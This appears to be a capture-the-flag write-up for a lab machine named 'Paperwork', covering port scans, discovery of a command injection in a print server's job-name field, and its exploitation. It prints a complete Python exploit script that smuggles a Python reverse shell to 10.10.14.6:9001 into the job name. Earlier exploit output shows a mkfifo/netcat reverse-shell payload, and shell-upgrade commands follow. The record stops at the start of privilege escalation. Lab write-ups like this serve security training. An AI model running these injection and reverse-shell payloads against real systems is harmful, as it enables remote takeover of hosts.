# Paperwork

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.46.140

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/paperwork_tcp.htb $ip
# 22/tcp   open  ssh
# 80/tcp   open  http
# 1515/tcp open  ifor-protocol



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/paperwork_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/paperwork_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>&#x20;

**Let's modfiy the hosts  file then we discover the web app**

{% code overflow="wrap" %}
```bash
echo "$ip paperwork.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
unzip -l paperwork-archive-v1.02.zip
# 2820  2026-03-12 09:09   server.py
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

**Debbuging this file it contain i think a command injection in the handle\_print\_job method**

{% code overflow="wrap" %}
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
{% endcode %}

**The `job_name` is extracted from lines starting with 'J' in the print job content, and it's directly inserted into a shell command without sanitization!**

{% code overflow="wrap" %}
```bash
python3 exploit.py
============================================================
Attempt 1: Reverse Shell
============================================================
[*] Connected to 10.129.45.122:1515
[*] Job Request Ack: b'\x00'
[*] Using payload: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f; echo '
[*] Control Header Ack: b'\x00'
[*] Sent 90 bytes of content
[*] Content Ack 1: b'\x00'
[-] Timeout waiting for acks. Server might have crashed or payload failed.
[*] Waiting 3 seconds for shell...
[*] Connection closed
```
{% endcode %}

{% hint style="info" %}
**Remote job submission must conform to business requirements for archival indexing. Submissions without a valid identifier will fail to process through the legacy intake processor.**
{% endhint %}

**this is mentionned in the index page this why i dont receive replies however the exploit it work or not**

<mark style="color:blue;">**Step 4**</mark>

**Now we start scanning for hidden endpoints and also vhosts**&#x20;

**i cant found nothing so returning to the exploit i tried more and it work**&#x20;

{% code overflow="wrap" %}
```python
#!/usr/bin/env python3
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.129.46.140"
PORT = 1515

# Based on the banner: "Archive_Printer is ready and printing."
QUEUE_NAMES = ["Archive_Printer", "Archive", "Printer", "lp", "default","archive_intake"]

def try_queue(queue_name, use_null=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((TARGET, PORT))
        payload = b"\x02" + queue_name.encode()
        if use_null:
            payload += b"\x00"
        s.send(payload)
        ack = s.recv(1)
        if ack == b"\x00":
            return s
        s.close()
    except:
        s.close()
    return None

def send_control_file(s, job_name):
    # Construct the LPD control file
    # H = host, P = user, J = job name (where our injection happens)
    control_content = f"Hlocalhost\nProot\nJ{job_name}\n".encode()
    size = len(control_content)

    # Subcommand 2: Receive control file
    # Format: \x02 + size + " " + filename + \x00
    header = f"\x02{size} cfA001localhost\x00".encode()
    s.send(header)

    # Server expects \x00 ack for header
    if s.recv(1) != b"\x00":
        print("[-] No ack for control header")
        return False

    # Send the actual control file content
    s.send(control_content)

    # Server expects \x00 ack for content
    if s.recv(1) != b"\x00":
        print("[-] No ack for control content")
        return False

    return True

if __name__ == "__main__":
    print(f"[*] Target: {TARGET}:{PORT}")

    for q in QUEUE_NAMES:
        # Try without null byte first, then with null byte
        for use_null in [False, True]:
            print(f"[*] Trying queue: '{q}' (null_byte={use_null})")
            s = try_queue(q, use_null)

            if s:
                print(f"[+] SUCCESS! Queue accepted: '{q}'")

                # Command Injection Payload
                # The server runs: echo 'Archive: {job_name}' >> /tmp/archive.log
                # We break out of the single quotes to execute our command.
                payload_job = "' ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);   os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);' ; echo '"

                print(f"[*] Sending control file with payload: {payload_job}")
                if send_control_file(s, payload_job):
                    print("[+] Exploit sent successfully!")
                    print("[*] Verify command execution by checking if /tmp/pwned exists on the target.")
                s.close()
                sys.exit(0)
            else:
                print(f"[-] Rejected")

    print("[-] Could not find a valid queue name.")
```
{% endcode %}

{% code overflow="wrap" %}
```bash
listener 9001
connect to [10.10.14.6] from (UNKNOWN) [10.129.46.140] 36234

python3 -c 'import pty; pty.spawn("/bin/bash")'

# then CTRL+Z
stty raw -echo; fg
# hit ENTER twice
export TERM=xterm
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Let's now try to elevate our privs**

{% code overflow="wrap" %}
```bash
ss -tunlp
# tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
# tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
```
{% endcode %}

